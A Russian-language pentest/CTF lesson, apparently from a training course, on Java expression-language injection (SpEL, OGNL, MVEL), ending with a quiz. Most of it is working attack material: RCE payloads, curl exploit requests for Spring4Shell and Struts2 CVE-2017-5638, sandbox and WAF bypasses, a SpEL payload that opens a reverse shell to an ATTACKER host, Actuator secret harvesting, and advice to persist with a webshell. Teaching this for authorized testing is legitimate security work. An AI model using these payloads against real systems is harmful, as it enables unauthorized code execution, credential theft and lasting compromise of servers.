---
id: web-el-ognl-injection
title: "Expression Language и OGNL-инъекции (SpEL, OGNL, MVEL)"
category: web
parent: web-ssti-core
difficulty: hard
order: 2
tags: [spel, ognl, mvel, spring, struts, rce]
prerequisites: [web-ssti]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Инъекции в expression language Java: SpEL, OGNL, MVEL — от вычисления выражений до RCE (Spring4Shell, Struts2)."
---

Expression Language (EL) — это язык выражений, который Java-фреймворки используют для биндинга данных в представление, конфигурации и «динамических» значений. Если пользовательский ввод попадает в **вычисляемое выражение**, атакующий исполняет произвольный код. Три главных движка: **SpEL** (Spring), **OGNL** (Struts2, MyBatis), **MVEL** (JBoss, Drools). Это класс, породивший Spring4Shell и серию RCE в Struts2.

## Теория: что такое EL-инъекция

EL-выражение — строка, которую движок парсит и вычисляет: `#{...}`, `${...}`. Опасность в том, что язык выражений обычно **мощнее, чем данные**: он умеет обращаться к классам, вызывать методы, читать свойства. Простейшая проверка — математика:

```text
${7*7}      -> 49
#{7*7}      -> 49
%{7*7}      -> 49
```

Если `7*7` вычислилось — есть EL-инъекция, дальше выбираем движок.

## SpEL (Spring)

Spring Expression Language, синтаксис `#{...}` (реже `${...}`). Проверка и первые шаги:

```text
#{7*7}
#{T(java.lang.Runtime).getRuntime().exec('id')}
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}
#{T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'}).getInputStream(), T(java.nio.charset.StandardCharsets).UTF_8)}
```

Где встречается: `@Value("#{...}")`, SpEL в `@PreAuthorize`, параметры сортировки/фильтра, Spring Cloud Gateway, Spring Data (`#{...}` в запросах), Spring Boot Actuator.

## OGNL (Struts2)

Object-Graph Navigation Language, синтаксис `%{...}` (в Struts2). Проверка:

```text
%{7*7}
%{#context['xwork.MethodAccessor.denyMethodExecution']=false}
%{(#_memberAccess.allowStaticMethodAccess=true)(#context['com.opensymphony.xwork2.ActionContext.container'])}
```

Полноценный RCE-шаблон (упрощённо):

```text
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=...).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))}
```

Практически удобнее использовать готовый эксплойт-скрипт под конкретный CVE (см. ниже).

## MVEL и другие движки

- **MVEL** — `${...}`/`@{...}`, встречается в JBoss, Drools, ранних Spring.
- **JEXL** (Apache Commons JEXL) — `${...}` в JSP/библиотеках.
- **JUEL** — стандартный EL в JSP/Servlet.
- **Thymeleaf** — использует SpEL/OGNL внутри (см. `web-ssti-engines`).

## Разобранный пример: SpEL в параметре сортировки

Цель: `GET /api/items?sort=#{...}` — значение подставляется в SpEL-выражение.

Шаг 1 — проверка:

```bash
curl -s 'https://app.example/api/items?sort=%23%7B7*7%7D'
# в ответе "49" вместо имени поля -> инъекция
```

Шаг 2 — RCE:

```bash
curl -s "https://app.example/api/items" --data-urlencode \
 'sort=#{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"})}'
```

Шаг 3 — вывод через `StreamUtils`/`Scanner` (см. payload выше) или reverse shell.

## Разобранный пример: Spring4Shell (CVE-2022-22965)

Spring MVC с биндингом `WebDataBinder` позволял через параметры `class.module.classLoader.*` изменить `AccessLogValve` Tomcat и записать JSP-webshell. Условия: JDK 9+, Tomcat, Spring < 5.3.18/5.2.20, WAR на Tomcat.

```bash
# 1) меняем конфиг логгера на запись webshell в webroot
curl -s "https://app.example/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20...jsp..."
# 2) запрос-триггер, который логируется в файл
curl -s "https://app.example/?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
# 3) обращаемся к созданному .jsp
curl -s "https://app.example/shell.jsp?cmd=id"
```

Готовые PoC — в публичных репозиториях (spring4shell). Проверяйте версию и наличие Tomcat.

## Разобранный пример: Struts2 OGNL (CVE-2017-5638)

Уязвимость в парсинге `Content-Type` (Jakarta multipart) давала OGNL-инъекцию до аутентификации. Эксплойт — заголовок `Content-Type` с OGNL-payload:

```bash
curl -s "https://app.example/" -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...(exec)}"
```

Практично использовать `struts-pwn` / Metasploit `struts2_content_type_ognl`. Серия CVE Struts2 (S2-045/046/048/052/057) — все OGNL; подбирайте по версии.

## Где искать точку инъекции

- Параметры `sort=`, `filter=`, `expression=`, `name=`, `message=`.
- `@Value("#{...}")`, `@PreAuthorize("...")`, SpEL в конфигах.
- Spring Cloud Gateway routes (`filters`), Spring Data query derivation.
- Struts2 actions, `Content-Type`/`Content-Disposition` парсинг.
- Ошибки в ответе: `SpelEvaluationException`, `OgnlException`, `ognl.Ognl`, `MethodAccessor`.
- Actuator: `/actuator/env`, `/actuator/gateway/routes` — часто дают точки для SpEL.

## Инструменты

- **Burp** + payload-списки SpEL/OGNL.
- **`struts-pwn`** / Metasploit — для Struts2.
- **`spring4shell` PoC** — для CVE-2022-22965.
- **`ysoserial`** — если EL ведёт к десериализации.
- **`curl`** — доставка с `--data-urlencode`.

## Обходы sandbox

- **SpEL SimpleEvaluationContext vs StandardEvaluationContext** — если используется Simple, `T()`/`new` недоступны; ищите пути к `StandardEvaluationContext`.
- **OGNL `denyMethodExecution`** — сбрасывается через `#_memberAccess` (см. payload).
- **Фильтр по `T(`/`Runtime`** — собирайте имена строково (`T(java.lang.Ru`+`ntime)`), используйте `Class.forName`, `ScriptEngineManager`.
- **WAF по `#{`/`%{`** — URL/unicode-кодирование, разрыв тега.

## Что дальше / decision

1. Отправили `${7*7}`/`%{7*7}` → вернулось 49? Определяем движок по ошибке/контексту.
2. Spring → SpEL-payload (`T(Runtime)...`), Actuator/Cloud Gateway как усилители.
3. Struts2 → OGNL, готовый `struts-pwn` по версии.
4. Нет вывода → reverse shell/OOB.
5. RCE подтверждён → устойчивый канал + read-back.

## Частые ошибки

- **Путать движки.** SpEL `#{...}`, OGNL `%{...}` — разные payload.
- **Не определить контекст.** SimpleEvaluationContext ломает `T()`/`new`.
- **Забыть про версию.** Spring4Shell/Struts2-CVE привязаны к версиям.
- **Ждать вывода в ответе.** Часто слепо — OOB/reverse shell.
- **Игнорировать Actuator.** Он даёт дополнительные точки инъекции.
- **Ломать прод.** RCE — только с согласия.

## Полный разбор: SpEL → RCE (с выводом)

End-to-end на параметре сортировки, который подставляется в SpEL.

Шаг 1. Проверяем вычисление выражения:

```bash
curl -s 'https://app.example/api/items?sort=%23%7B7*7%7D' | head -c 80
# {"sortedBy":"49","items":[...]}   -> #{7*7} вычислено => SpEL-инъекция
```

Шаг 2. Проверяем доступ к классам (`T(...)`):

```bash
curl -s 'https://app.example/api/items?sort=%23%7BT(java.lang.Math).random()%7D'
# {"sortedBy":"0.7281...","items":[...]}   -> T() доступен => RCE возможен
```

Шаг 3. Выполняем команду и читаем вывод через `StreamUtils`:

```bash
curl -s 'https://app.example/api/items' -G --data-urlencode \
 'sort=#{T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream(), T(java.nio.charset.StandardCharsets).UTF_8)}'
# {"sortedBy":"uid=0(root) gid=0(root) groups=0(root)","items":[...]}
```

Шаг 4. Если вывод не отражается (blind) — reverse shell:

```bash
curl -s 'https://app.example/api/items' -G --data-urlencode \
 'sort=#{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","bash -i >& /dev/tcp/ATTACKER/4444 0>&1"})}'
```

Шаг 5. Read-back: подтвердите `id`/шелл. Для `exec` без вывода используйте OOB (`curl` на коллаборатор) — это надёжнее.

## Reference-таблица: движки, синтаксис, CVE

| Движок | Синтаксис | Где | Известные CVE |
|--------|-----------|-----|---------------|
| SpEL | `#{...}`, `${...}` | Spring, Cloud Gateway, Data | CVE-2022-22965 (Spring4Shell), CVE-2022-22963 (Cloud Function) |
| OGNL | `%{...}` | Struts2, MyBatis | S2-045/046/048/052/057, CVE-2017-5638 |
| MVEL | `${...}`, `@{...}` | JBoss, Drools | различные N-day |
| JEXL | `${...}` | Apache Commons JEXL | — |
| JUEL | `${...}` | JSP/Servlet EL | — |
| Thymeleaf | `*{...}`, `${...}` | Thymeleaf (SpEL внутри) | — |
| Groovy | `GString` | Jenkins, Gradle | CVE-2015-8103 и др. |

## Обход sandbox и фильтров

- **SimpleEvaluationContext:** `T()`/`new` недоступны. Ищите пути к `StandardEvaluationContext` (часто через `@PreAuthorize`, `@Value`, Actuator).
- **Фильтр по `T(`/`Runtime`:** собирайте имена строково:
  ```text
  #{T(String).valueOf(...)}  # или Class.forName
  #{''.getClass().forName('java.lang.Runtime')...}
  ```
  В SpEL: `#{T(java.lang.Class).forName('java.lang.Ru'+'ntime')}`.
- **Фильтр по `exec`:** используйте `ProcessBuilder` или `ScriptEngineManager` (Nashorn/Groovy):
  ```text
  #{new javax.script.ScriptEngineManager().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')}
  ```
- **WAF по `#{`/`%{`:** URL-кодирование (`%23%7B`), unicode, разрыв (`#\{`), вложенные конкатенации.
- **OGNL `denyMethodExecution`:** сбрасывается через `#_memberAccess`/`DEFAULT_MEMBER_ACCESS` (см. payload выше).
- **Ограничение длины:** передавайте команду частями/через файл.

## Spring Actuator как усилитель

Actuator-эндпоинты часто дают дополнительные точки инъекции и утечки:

```bash
curl -s https://app.example/actuator/env | jq '.propertySources[].properties | keys' | head
curl -s https://app.example/actuator/gateway/routes | jq .
```

- **`/actuator/env`:** переменные окружения (секреты, креды БД).
- **`/actuator/gateway/routes`:** Spring Cloud Gateway — добавление маршрута с SpEL-фильтром может дать RCE (CVE-2022-22947).
- **`/actuator/heapdump`:** дамп heap с токенами/паролями.
- **`/actuator/jolokia`:** JMX-операции → RCE (часто).
- **`/actuator/mappings`:** карта эндпоинтов.

Проверяйте `management.endpoints.web.exposure.include` — если `*`, поверхность огромна.

## Что делать дальше / решение

1. **Проверить `${7*7}`/`%{7*7}`** и определить движок по ошибке/контексту.
2. **Spring:** `T(Runtime)` → `StreamUtils` для вывода; проверить Actuator/Cloud Gateway.
3. **Struts2:** OGNL + готовый `struts-pwn` по версии.
4. **Sandbox:** обходить строковой сборкой/`ProcessBuilder`/`ScriptEngine`.
5. **Blind:** OOB/reverse shell, затем read-back (`id`).
6. **Закрепиться** (webshell/reverse shell), записать артефакт.
7. **Определить точную версию** фреймворка для выбора CVE.

## Определение версии фреймворка и подбор CVE

EL-инъекции привязаны к версиям, поэтому точное определение версии — ключ к выбору payload/CVE.

**Spring:**

```bash
curl -s https://app.example/actuator/info | jq .        # build.version
curl -s https://app.example/actuator/env | jq '.propertySources' | head
curl -sI https://app.example/ | grep -i 'x-application-context'
# ошибки Whitelabel/stacktrace раскрывают версию Spring
```

Признаки Spring: заголовок `X-Application-Context`, страница ошибок Whitelabel, cookie `JSESSIONID`, `/actuator/*`.

**Struts2:**

```bash
curl -sI https://app.example/ | grep -i 'x-powered-by'    # иногда Struts
# .action в путях: /login.action, /index.action
# ошибки: com.opensymphony.xwork2, ognl.OgnlException
```

**Подбор CVE:**

| Признак | Версия | CVE/payload |
|---------|--------|-------------|
| Spring MVC, JDK9+, Tomcat, WAR | < 5.3.18 / 5.2.20 | CVE-2022-22965 (Spring4Shell) |
| Spring Cloud Function | 3.0.0–3.2.2 | CVE-2022-22963 (SpEL в routing) |
| Spring Cloud Gateway Actuator | < 3.1.0 | CVE-2022-22947 (SpEL route) |
| Struts2 multipart | 2.3.5–2.3.31, 2.5–2.5.10 | CVE-2017-5638 (S2-045) |
| Struts2 (разные) | серия | S2-046/048/052/057 |

Готовые эксплойты: `struts-pwn`, Metasploit-модули, `spring4shell` PoC. Скачанный PoC — недоверенный код: **прочитайте**, репойнтите колбэки на себя, оцените, не уронит ли он цель (особенно Struts2 DoS-варианты).

## Что делать дальше / решение

1. **Определить фреймворк/версию** (Actuator, заголовки, ошибки, `.action`).
2. **Подтвердить EL-инъекцию** (`#{7*7}`/`%{7*7}`).
3. **Выбрать CVE/payload** по версии (SpEL/OGNL).
4. **Проверить Actuator/Gateway** как усилители (RCE, секреты).
5. **Обойти sandbox/фильтры** (строковая сборка, ProcessBuilder, ScriptEngine).
6. **Подтвердить RCE** (read-back `id`) и закрепиться.
7. **Оформить PoC** с версией и точным payload.

## Быстрый чек-лист EL-инъекции

1. `${7*7}` / `#{7*7}` / `%{7*7}` — вычисляется ли.
2. Определить движок (Spring/Struts2/MVEL) по ошибке/контексту.
3. Spring → SpEL `T(Runtime)` + `StreamUtils` для вывода.
4. Struts2 → OGNL + `struts-pwn` по версии.
5. Проверить Actuator/Gateway (дополнительный RCE и секреты).
6. Обойти sandbox (строковая сборка, ProcessBuilder, ScriptEngine).
7. Blind → OOB/reverse shell, затем read-back (`id`).

## Квиз

```quiz
- question: "Какой EL использует Spring?"
  options:
    - "OGNL"
    - "SpEL"
    - "MVEL"
    - "EL"
  answer: 1
  explanation: "Spring Expression Language."
- question: "Как в SpEL обратиться к классу?"
  options:
    - "@java.lang.Runtime@"
    - "T(java.lang.Runtime)"
    - "class Runtime"
    - "new Runtime"
  answer: 1
  explanation: "T(...) в SpEL."
- question: "Какой фреймворк связан с OGNL и CVE-2017-5638?"
  options:
    - "Spring"
    - "Struts2"
    - "JSF"
    - "Play"
  answer: 1
  explanation: "Struts2 использует OGNL."
- question: "Почему exec() сам по себе не показывает вывод?"
  options:
    - "Он шифрует"
    - "Нужно прочитать InputStream процесса"
    - "Он медленный"
    - "Он в другом потоке"
  answer: 1
  explanation: "Вывод надо явно считать из потока."
- question: "Что эксплуатирует Spring4Shell?"
  options:
    - "SQL-инъекцию"
    - "Data binding class.module.classLoader для записи JSP"
    - "XSS"
    - "CSRF"
  answer: 1
  explanation: "CVE-2022-22965 — модификация Tomcat через binding."
```

## Где пригодится

- **CTF (Web):** задачи на Spring/Struts.
- **Bug bounty:** EL-инъекции — критичный RCE-отчёт.
- **Пентест:** аудит Java-приложений и N-day.
- **Работа (AppSec):** не передавать ввод в evaluator, обновлять Spring/Struts, sandbox.
